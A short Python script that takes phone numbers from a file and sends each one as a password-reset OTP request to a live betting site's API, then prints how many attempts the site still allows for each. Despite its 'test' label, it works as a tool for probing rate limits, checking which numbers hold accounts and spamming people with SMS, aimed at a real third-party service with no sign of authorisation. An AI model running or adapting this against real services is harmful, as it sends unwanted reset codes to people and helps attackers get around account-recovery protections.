import requests
import os

url = "https://www.betpawa.cm/api/user/v3/password/request-otp"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "X-Pawa-Brand": "betpawa-cameroon",
    "X-Pawa-Language": "en"
}

# Load test set dynamically from abang.txt
test_numbers = []
if os.path.exists("abang.txt"):
    with open("abang.txt", "r") as file:
        test_numbers = [line.strip() for line in file if line.strip()]
else:
    print("Error: abang.txt file not found!")
    exit(1)

session = requests.Session()

print("=== NUMBER VARIATION TEST ===\n")

for num in test_numbers:
    payload = {
        "phoneNumber": num,
        "resetMethodName": "SMS"
    }

    r = session.post(url, headers=headers, json=payload)

    try:
        data = r.json()
    except:
        data = {}

    limit = data.get("limit", {})
    allowed = limit.get("allowed")
    attempts_left = limit.get("attemptsLeft")

    print(f"Number: {num}")
    print("Status:", r.status_code)
    print("Allowed:", allowed)
    print("Attempts Left:", attempts_left)
    print("-" * 40)
